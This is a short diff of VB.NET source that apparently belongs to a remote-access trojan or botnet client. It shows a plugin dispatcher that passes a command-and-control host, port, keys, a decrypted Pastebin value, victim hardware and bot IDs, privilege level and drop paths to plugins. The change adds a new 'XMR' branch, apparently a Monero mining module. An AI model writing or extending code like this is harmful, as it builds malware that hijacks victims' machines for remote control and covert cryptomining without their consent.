@@ -46,8 +46,10 @@
                         If GM.Name = "CN" Then
                             GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.EncryptionKey, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                         ElseIf GM.Name = "MISC" Then
-                            GM.Invoke(Nothing, New Object() {CMD})
-                            ElseIf GM.Name = "CL" Then
+                            GM.Invoke(Nothing, New Object() {C_ID.HWID, CMD})
+                        ElseIf GM.Name = "CL" Then
+                            GM.Invoke(Nothing, New Object() {C_Settings.DROP, C_Settings.EXE, C_Settings.fullpath, C_ID.Privileges, C_ID.HWID, CMD})
+                        ElseIf GM.Name = "XMR" Then
                             GM.Invoke(Nothing, New Object() {C_Settings.DROP, C_Settings.EXE, C_Settings.fullpath, C_ID.Privileges, C_ID.HWID, CMD})
                         End If
                     Next
